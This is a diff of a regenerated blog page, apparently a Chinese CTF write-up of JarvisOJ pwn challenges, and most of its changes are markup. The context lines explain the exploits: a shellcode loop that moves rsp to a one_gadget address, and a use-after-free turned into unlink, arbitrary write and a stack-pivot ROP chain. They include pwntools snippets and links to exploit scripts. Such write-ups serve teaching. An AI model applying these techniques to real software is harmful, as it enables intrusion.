+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_png2ascii/solve.py">exploit here</a></p>
-
-<h2 id="61dctf-inst-500">[61dctf]inst (500)</h2>
-
+</div><p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_png2ascii/solve.py">exploit here</a></p>
+<h2 id="61dctfinst-500">[61dctf]inst (500)</h2>
 <p>这是 Google CTF2017 的一道原题。</p>
-
 <p>看一下程序的主要逻辑</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2586,13 +2476,13 @@ id
   <span class="k">if</span> <span class="p">(</span> <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">8</span> <span class="p">)</span>
     <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
   <span class="n">free_page</span><span class="p">(</span><span class="n">v0</span><span class="p">);</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>每次会申请一段空间，设置可执行权限，然后读 4 个字节到 template 中，最后执行 template，看一下 template</p>
+</div><p>每次会申请一段空间，设置可执行权限，然后读 4 个字节到 template 中，最后执行 template，看一下 template</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2619,17 +2509,15 @@ id
 <span class="nl">.rodata:</span><span class="err">0000000000000</span><span class="nf">C09</span>                 <span class="no">sub</span>     <span class="no">ecx</span><span class="p">,</span> <span class="mi">1</span>
 <span class="nl">.rodata:</span><span class="err">0000000000000</span><span class="nf">C0C</span>                 <span class="no">jnz</span>     <span class="no">short</span> <span class="no">loc_C05</span>
 <span class="nl">.rodata:</span><span class="err">0000000000000</span><span class="nf">C0E</span>                 <span class="no">retn</span>
-<span class="nl">.rodata:</span><span class="err">0000000000000</span><span class="nf">C0E</span> <span class="no">template</span>        <span class="no">endp</span></code></pre></td></tr></table>
+<span class="nl">.rodata:</span><span class="err">0000000000000</span><span class="nf">C0E</span> <span class="no">template</span>        <span class="no">endp</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>根据这段汇编的逻辑，我们每次的输入会被程序反复执行 1000 次，但可以用 ret 跳出这段循环。</p>
-
+</div><p>根据这段汇编的逻辑，我们每次的输入会被程序反复执行 1000 次，但可以用 ret 跳出这段循环。</p>
 <p>如果能设置 rsp，使用 ret 就能控制程序的运行流程了。比如把 rsp 改成 rop chain 的开头或者 one_gadget。</p>
-
 <p>调试可以发现在 do_test() 运行的过程中，r14， r15 两个寄存器是不变的，因此可以考虑用这两个寄存器保存一些值。以设置 rsp 为 one_gadget 为例，首先我们需要一个 libc 上的地址，并且距离 one_gadget 比较近，调试可以发现在 templete 开头时，<code>rsp + 0x40</code> 这个地方存储了 <code>__libc_start_main + 231</code>，这个地址距离 one_gadget 较近，先把这个地址保存到 r14 上</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2652,13 +2540,13 @@ id
 <span class="err">06:0030│</span>      <span class="err">0</span><span class="nf">x7ffeb2d93438</span> <span class="err">—▸</span> <span class="mi">0x5641ea3768c7</span> <span class="err">◂—</span> <span class="no">jmp</span>    <span class="mi">0x5641ea3768c0</span>
 <span class="err">07:0038│</span>      <span class="err">0</span><span class="nf">x7ffeb2d93440</span> <span class="err">—▸</span> <span class="mi">0x5641ea376b60</span> <span class="err">◂—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="err">08:0040│</span>      <span class="err">0</span><span class="nf">x7ffeb2d93448</span> <span class="err">—▸</span> <span class="mi">0x7fcc312aaa87</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="p">)</span> <span class="err">◂—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
-<span class="err">09:0048│</span>      <span class="err">0</span><span class="nf">x7ffeb2d93450</span> <span class="err">◂—</span> <span class="mi">0x0</span></code></pre></td></tr></table>
+<span class="err">09:0048│</span>      <span class="err">0</span><span class="nf">x7ffeb2d93450</span> <span class="err">◂—</span> <span class="mi">0x0</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>通过 0x40 次循环可以把这个地址保存在 r14 上</p>
+</div><p>通过 0x40 次循环可以把这个地址保存在 r14 上</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2671,13 +2559,13 @@ id
 <span class="o">&gt;&gt;&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;inc r14&#39;</span><span class="p">))</span>
 <span class="mi">3</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov r14, [r14]; ret&#39;</span><span class="p">))</span>
-<span class="mi">4</span></code></pre></td></tr></table>
+<span class="mi">4</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>然后再根据 libc 中的偏移是固定的，更改 r14 为 one_gadget 地址</p>
+</div><p>然后再根据 libc 中的偏移是固定的，更改 r14 为 one_gadget 地址</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2692,30 +2580,27 @@ id
     <span class="k">print</span> <span class="s2">&#34;loop for {:#x} times...&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">loop</span><span class="p">)</span>
     <span class="n">pause</span><span class="p">()</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">loop</span><span class="p">):</span>
-        <span class="n">execsc</span><span class="p">(</span><span class="n">add_r14</span><span class="p">)</span></code></pre></td></tr></table>
+        <span class="n">execsc</span><span class="p">(</span><span class="n">add_r14</span><span class="p">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>最后修改 rsp 即可</p>
+</div><p>最后修改 rsp 即可</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov [rsp], r14&#39;</span><span class="p">))</span>
-<span class="mi">4</span></code></pre></td></tr></table>
+<span class="mi">4</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_inst/exp.py">exploit here</a></p>
-
-<h2 id="61dctf-xworks-500">[61dctf]xworks (500)</h2>
-
+</div><p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_inst/exp.py">exploit here</a></p>
+<h2 id="61dctfxworks-500">[61dctf]xworks (500)</h2>
 <p>静态编译的程序，并且是 strip 后的，先用 rizzo 和 sig 恢复一下符号。</p>
-
 <p>程序的逻辑很简单，漏洞也很明显，在 delete， show 和 edit 功能中均存在 uaf</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2786,71 +2671,40 @@ id
     <span class="n">j_free</span><span class="p">(</span><span class="n">chunk_list</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>                    <span class="c1">// uaf
 </span><span class="c1"></span>  <span class="k">else</span>
     <span class="n">_libc_write</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&#34;Error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">6LL</span><span class="p">);</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>题目没有溢出的漏洞，难点在于如何利用这个 uaf。通过 free 两个fastbin 可以 leak 出堆的地址，然后在堆上伪造 chunk 的 meta data 可以造成 unlink，用 unlink 造成任意地址读写后，方法就比较多了。</p>
-
+</div><p>题目没有溢出的漏洞，难点在于如何利用这个 uaf。通过 free 两个fastbin 可以 leak 出堆的地址，然后在堆上伪造 chunk 的 meta data 可以造成 unlink，用 unlink 造成任意地址读写后，方法就比较多了。</p>
 <p>我的方法是通过多次任意地址写在一个固定地址（如 elf.bss() + 0x500) 上写 rop chain，然后再次通过任意地址写改写 rbp 和 ret addr，通过 stack-pivot 来跳转到 rop chain。</p>
-
 <p><a href="https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_xwork/exp.py">exploit here</a></p>
-
 <h1 id="广告时间">广告时间</h1>
-
 <h2 id="广告一">广告一</h2>
-
 <p>目前和几位朋友（来自各大战队）一起做的 <a href="https://ctf-wiki.github.io/ctf-wiki/">ctf-wiki</a></p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fve2xfo1j6j31020igjur.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fve2xfo1j6j31020igjur.jpg" alt=""></p>
 <p>包括 CTF 中各个分类的基础知识及相关例题，也处于持续更新的过程中。</p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fve33tp777j305508j3ym.jpg" alt="" /></p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fve3498t1kj304v08u74e.jpg" alt="" /></p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fve3498t1kj304v08u74e.jpg" alt="" /></p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fve351ks2gj305r0570st.jpg" alt="" /></p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fve351ks2gj305r0570st.jpg" alt="" /></p>
-
-<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fve35nfizyj306d040jrb.jpg" alt="" /></p>
-
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fve33tp777j305508j3ym.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fve3498t1kj304v08u74e.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fve3498t1kj304v08u74e.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fve351ks2gj305r0570st.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fve351ks2gj305r0570st.jpg" alt=""></p>
+<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fve35nfizyj306d040jrb.jpg" alt=""></p>
 <p>欢迎各位大佬加入（尤其是 web 前端大佬）</p>
-
 <h2 id="广告二">广告二</h2>
-
 <p><a href="http://m4x.fun">My Blog</a></p>
-
 <p><a href="https://github.com/bash-c">My Github</a></p>
-
 <p>欢迎师傅们一起交流 :)</p>
-
 <h1 id="reference-and-thanks-to">Reference and Thanks to</h1>
-
 <p><a href="https://www.jarviswang.me">https://www.jarviswang.me</a></p>
-
 <p>Linux Manual Page</p>
-
 <p><a href="http://docs.pwntools.com/en/stable/index.html">http://docs.pwntools.com/en/stable/index.html</a></p>
-
 <p><a href="https://github.com/Naetw/CTF-pwn-tips">https://github.com/Naetw/CTF-pwn-tips</a></p>
-
 <p><a href="https://veritas501.space/2017/03/10/JarvisOJ_WP/">https://veritas501.space/2017/03/10/JarvisOJ_WP/</a></p>
-
 <p><a href="http://blog.csdn.net/charlie_heng">http://blog.csdn.net/charlie_heng</a></p>
-
 <p><a href="https://www.jianshu.com/p/40f846d14450">https://www.jianshu.com/p/40f846d14450</a></p>
-
 <p><a href="https://www.jianshu.com/p/3d3a37c3e1c7">https://www.jianshu.com/p/3d3a37c3e1c7</a></p>
-
 <p><a href="http://muhe.live/2016/12/24/what-DynELF-does-basically/">http://muhe.live/2016/12/24/what-DynELF-does-basically/</a></p>
-
 <p><a href="https://pastebin.com/eqzdtwmw">https://pastebin.com/eqzdtwmw</a></p>
-
 <p><a href="https://gloxec.github.io/2017/05/16/Reverse%20Engineer%20a%20stripped%20binary/">https://gloxec.github.io/2017/05/16/Reverse%20Engineer%20a%20stripped%20binary/</a></p>
-
 <p><a href="http://www.freebuf.com/articles/terminal/134980.html">http://www.freebuf.com/articles/terminal/134980.html</a></p>
 
     </div>
@@ -2872,7 +2726,7 @@ id
       
       <nav class="post-nav">
         
-          <a class="prev" href="/post/cve-2017-11543-analysis/">
+          <a class="prev" href="/post/linux-kernel-pwn-abc-1/">
             
             <i class="iconfont">
               <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
@@ -2882,7 +2736,7 @@ id
 </svg>
 
             </i>
-            <span class="prev-text nav-default">CVE-2017-11543 Analysis</span>
+            <span class="prev-text nav-default">Linux Kernel Pwn ABC(Ⅰ)</span>
             <span class="prev-text nav-mobile">Prev</span>
           </a>
         
@@ -2986,7 +2840,7 @@ id
     &copy;
     
        -
-    2019
+    2020
     <span class="heart">
       
       <i class="iconfont">
